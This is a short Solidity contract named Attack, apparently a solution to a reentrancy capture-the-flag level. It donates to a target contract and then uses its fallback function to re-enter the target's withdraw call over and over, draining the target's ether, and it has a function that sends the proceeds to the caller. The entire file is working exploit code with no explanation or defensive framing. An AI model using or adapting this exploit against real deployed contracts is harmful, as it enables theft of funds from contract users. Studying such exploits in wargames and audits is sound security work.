// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract Attack {
    address target;

    constructor(address _target) public payable {
        target = _target;
    }

    function attack() public payable {
        IReentrance(target).donate(address(this));
        IReentrance(target).withdraw(1000000000000000);
    }

    function withdraw() public {
        msg.sender.send(address(this).balance);
    }

    fallback() external payable {
        if (address(target).balance >= 1000000000000000) {
            IReentrance(target).withdraw(1000000000000000);
        }
    }

}
